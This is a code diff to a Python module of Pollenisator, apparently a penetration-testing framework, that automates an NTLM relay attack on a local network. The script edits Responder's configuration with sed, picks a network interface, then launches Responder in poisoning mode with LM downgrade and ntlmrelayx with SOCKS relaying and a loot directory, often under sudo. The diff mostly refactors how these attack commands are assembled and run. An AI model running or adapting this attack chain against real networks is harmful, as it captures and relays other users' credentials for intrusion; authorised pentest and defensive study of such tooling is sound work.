@@ -1,12 +1,11 @@
 import multiprocessing
 import subprocess
-import psutil
 import pollenisatorgui.core.components.utils as utils
 import tempfile
 import os
 import shutil
 from pollenisatorgui.core.components.apiclient import APIClient
-from pollenisatorgui.scripts.lan.utils import checkPath
+from pollenisatorgui.scripts.lan.utils import checkPath, getNICs
 from pollenisatorgui.pollex import pollex_exec
 
 def main(apiclient, appli, **kwargs):
@@ -15,9 +14,9 @@ def main(apiclient, appli, **kwargs):
         from pollenisatorgui.core.application.dialogs.ChildDialogCombo import ChildDialogCombo
         import tkinter as tk
 
-    responder_path = utils.which_expand_alias("responder")
+    responder_path = utils.which_expand_alias("Responder.py")
     if responder_path is None:
-        responder_path = utils.which_expand_alias("Responder.py")
+        responder_path = utils.which_expand_alias("responder")
     if responder_path is None:
         responder_path = utils.which_expand_alias("responder.py")
     if responder_path is None:
@@ -86,42 +85,47 @@ def main(apiclient, appli, **kwargs):
                     cmd = 'sed -i -E "s/(HTTP|SMB) = On/\\1 = Off/gm" '+str(responder_conf)
                     appli.launch_in_terminal(None, "sed for responder", cmd, use_pollex=False)
             else:
-                print("Responder conf found at :")
-                print(stdout.split("\n"))
-                responder_conf = input("Choose your responder config file by its full path:")
+                possibilites = [x.strip() for x in stdout.split("\n") if x.strip() != ""]
+                if len(possibilites) > 1:
+                    print("Many responder conf found, choose one :")
+
+                    for i, path in enumerate(possibilites):
+                        if path.strip() == "":
+                            continue
+                        print(str(i+1)+". "+path)
+                    responder_conf = input("Choose your responder config file by its number:")
+                    try:
+                        responder_conf = possibilites[int(responder_conf)-1]
+                    except:
+                        return False, "Wrong number given"
+                else:
+                    responder_conf = possibilites[0]
                 if responder_conf.strip() == "":
                     return False, "Responder conf not given"
                 if os.geteuid() != 0:
                     cmd = "sudo "+cmd
                 cmd = 'sed -i -E "s/(HTTP|SMB) = On/\\1 = Off/gm" '+str(responder_conf)
                 os.popen(cmd)
-    addrs = psutil.net_if_addrs()
-    if appli:
-        dialog = ChildDialogCombo(None, addrs.keys(), displayMsg="Choose your ethernet device to listen on")
-        dialog.app.wait_window(dialog.app)
-        if dialog.rvalue is None:
-            return False, "No ethernet device chosen"
-        eth = dialog.rvalue
-    else:
-        print("Choose your ethernet device to listen on")
-        print(addrs.keys())
-        eth = input("Choose your ethernet device to listen on (type it):")
-        if eth is None:
-            return False, "No ethernet device chosen"
+    try:
+        eth = getNICs(graphical=appli is not None)
+    except ValueError as e:
+        return False, str(e)
+    
+        
     cmd = f"{responder_path} -I {eth} -dvw --lm --disable-ess"
     if os.geteuid() != 0:
         cmd = "sudo "+cmd
     if appli:
         appli.launch_in_terminal(None, "responder", cmd, use_pollex=False)
     else:
-        os.popen(cmd+"&")
+        subprocess.run(cmd+"&", shell=True)
     cmd = f"{path} -tf {file_name} -smb2support -socks -l {relaying_loot_path}"
     if os.geteuid() != 0:
         cmd = "sudo "+cmd
     if appli:
         appli.launch_in_terminal(kwargs.get("default_target",None), "ntlmrelayx for responder", cmd, use_pollex=False)
     else:
-        pollex_exec(cmd, verbose=False)
+        subprocess.run(cmd, shell=True)
     return True, f"Listening ntlmrelay opened, loot directory is here:"+str(relaying_loot_path)+"\n"+ \
             "Don't forget to open Responder with HTTP and SMB disabled\n" + \
                 "Proxychains port should be 1080 (default)"
